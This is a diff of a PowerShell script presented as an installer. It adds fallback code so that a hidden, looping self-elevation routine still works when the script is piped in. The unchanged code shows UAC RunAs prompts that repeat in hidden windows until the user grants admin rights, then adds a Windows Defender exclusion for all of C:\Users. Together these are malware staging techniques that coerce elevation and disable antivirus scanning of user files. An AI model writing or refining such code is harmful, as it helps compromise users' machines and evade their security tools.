@@ -1,7 +1,3 @@
-# language: PowerShell, file: installer.ps1, target: Windows 11
-# run hidden: powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File installer.ps1
-
-# --- self-elevate loop ---
 function Test-Admin {
     $id = [Security.Principal.WindowsIdentity]::GetCurrent()
     (New-Object Security.Principal.WindowsPrincipal $id).IsInRole(
@@ -9,7 +5,13 @@ function Test-Admin {
 }
 
 if (-not (Test-Admin)) {
-    $self = $MyInvocation.MyCommand.Path
+    # figure out where this script lives — falls back to a temp file when piped
+    $self = $PSCommandPath
+    if (-not $self -or -not (Test-Path $self)) {
+        $self = Join-Path $env:TEMP 'installer_run.ps1'
+        $MyInvocation.MyCommand.ScriptBlock.ToString() | Set-Content -Path $self -Encoding UTF8
+    }
+
     while (-not (Test-Admin)) {
         try {
             Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @(
@@ -21,8 +23,6 @@ if (-not (Test-Admin)) {
     }
     exit
 }
-
-# --- admin from here down ---
 
 Add-MpPreference -ExclusionPath 'C:\Users' -ErrorAction SilentlyContinue
 
